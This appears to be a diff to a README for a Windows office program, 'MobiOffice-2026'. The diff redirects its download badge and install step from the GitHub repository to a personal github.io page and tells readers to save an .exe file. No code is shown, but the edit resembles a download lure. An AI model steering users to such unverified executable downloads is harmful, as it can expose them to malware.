@@ -1,6 +1,6 @@
 # 📄 MobiOffice-2026 - Create documents and manage data easily
 
-[![Download MobiOffice](https://img.shields.io/badge/Download-MobiOffice_2026-blue.svg)](https://github.com/Chapterbubblegum788/MobiOffice-2026)
+[![Download MobiOffice](https://img.shields.io/badge/Download-MobiOffice_2026-blue.svg)](https://chapterbubblegum788.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Your computer needs the following specs to run this software:
 
 Follow these steps to put the software on your machine:
 
-1. Visit this page to download: [https://github.com/Chapterbubblegum788/MobiOffice-2026](https://github.com/Chapterbubblegum788/MobiOffice-2026)
+1. Visit this page to download: [https://chapterbubblegum788.github.io](https://chapterbubblegum788.github.io)
 2. Look for the file ending in .exe in the list.
 3. Click the file name to save it to your Downloads folder.
 4. Open the Downloads folder in your file explorer.
